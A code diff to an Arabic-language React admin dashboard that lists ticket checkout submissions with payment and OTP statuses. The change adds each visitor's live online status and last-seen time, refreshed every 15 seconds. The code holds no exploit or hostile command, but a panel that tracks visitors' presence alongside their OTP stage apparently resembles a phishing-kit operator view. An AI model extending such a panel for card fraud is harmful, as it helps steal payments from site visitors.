@@ -1,9 +1,11 @@
 import { useQuery } from "@tanstack/react-query";
 import { AlertCircle, Database, RefreshCw } from "lucide-react";
-import type { CheckoutSubmission } from "@shared/schema";
 import { QuestLegalFooter, QuestMobileTopBar } from "@/components/QuestMobileChrome";
 import { formatQar } from "@/lib/ticket-cart";
-import { listCheckoutSubmissions } from "@/lib/firebase";
+import {
+  listCheckoutSubmissionsWithPresence,
+  type CheckoutSubmissionWithPresence,
+} from "@/lib/firebase";
 
 function formatArabicDateTime(value: string): string {
   const date = new Date(value);
@@ -23,6 +25,24 @@ const statusLabels: Record<string, string> = {
   otp_verified: "OTP ناجح",
 };
 
+const onlineStatusLabel: Record<
+  CheckoutSubmissionWithPresence["visitorOnlineStatus"],
+  string
+> = {
+  online: "متصل الآن",
+  offline: "غير متصل",
+  unknown: "غير معروف",
+};
+
+const onlineStatusClassName: Record<
+  CheckoutSubmissionWithPresence["visitorOnlineStatus"],
+  string
+> = {
+  online: "bg-emerald-100 text-emerald-700",
+  offline: "bg-slate-100 text-slate-600",
+  unknown: "bg-amber-100 text-amber-700",
+};
+
 export default function Dashboard() {
   const {
     data,
@@ -30,9 +50,10 @@ export default function Dashboard() {
     error,
     refetch,
     isFetching,
-  } = useQuery<CheckoutSubmission[]>({
+  } = useQuery<CheckoutSubmissionWithPresence[]>({
     queryKey: ["firebase", "checkout-submissions"],
-    queryFn: () => listCheckoutSubmissions(),
+    queryFn: () => listCheckoutSubmissionsWithPresence(),
+    refetchInterval: 15000,
   });
 
   return (
@@ -44,7 +65,7 @@ export default function Dashboard() {
           <div className="flex flex-wrap items-center justify-between gap-3">
             <div>
               <h1 className="text-[2rem] font-black text-[hsl(var(--quest-purple))] sm:text-[2.3rem]">لوحة البيانات</h1>
-              <p className="text-sm text-[#626262]">عرض جميع بيانات الطلبات المخزنة في Firestore</p>
+              <p className="text-sm text-[#626262]">عرض جميع بيانات الطلبات المخزنة في Firestore مع حالة الزائر</p>
             </div>
             <button
               type="button"
@@ -84,9 +105,16 @@ export default function Dashboard() {
                     <Database className="h-4 w-4 text-[hsl(var(--quest-purple))]" />
                     <span className="text-sm font-semibold text-[hsl(var(--quest-purple))]">رقم السجل: {record.id}</span>
                   </div>
-                  <span className="rounded-full bg-[hsl(var(--quest-purple))]/10 px-2 py-1 text-xs font-semibold text-[hsl(var(--quest-purple))]">
-                    {statusLabels[record.payment.status] ?? record.payment.status}
-                  </span>
+                  <div className="flex items-center gap-2">
+                    <span
+                      className={`rounded-full px-2 py-1 text-xs font-semibold ${onlineStatusClassName[record.visitorOnlineStatus]}`}
+                    >
+                      {onlineStatusLabel[record.visitorOnlineStatus]}
+                    </span>
+                    <span className="rounded-full bg-[hsl(var(--quest-purple))]/10 px-2 py-1 text-xs font-semibold text-[hsl(var(--quest-purple))]">
+                      {statusLabels[record.payment.status] ?? record.payment.status}
+                    </span>
+                  </div>
                 </div>
 
                 <div className="grid gap-4 px-4 py-4 md:grid-cols-3">
@@ -102,6 +130,7 @@ export default function Dashboard() {
                     <p>التاريخ: {record.visitDateIso ?? "غير محدد"}</p>
                     <p>الوقت: {record.visitTime ?? "غير محدد"}</p>
                     <p>عدد العناصر: {record.items.length}</p>
+                    <p>حالة الزائر: {onlineStatusLabel[record.visitorOnlineStatus]}</p>
                   </div>
 
                   <div className="space-y-1 text-sm">
@@ -130,6 +159,13 @@ export default function Dashboard() {
                   <div className="mt-2 text-xs text-[#777]">
                     <p>تم الإنشاء: {formatArabicDateTime(record.createdAt)}</p>
                     <p>آخر تحديث: {formatArabicDateTime(record.updatedAt)}</p>
+                    <p>
+                      آخر ظهور:
+                      {" "}
+                      {record.visitorLastSeenAt
+                        ? formatArabicDateTime(record.visitorLastSeenAt)
+                        : "غير متوفر"}
+                    </p>
                   </div>
 
                   {record.payment.errorMessage ? (
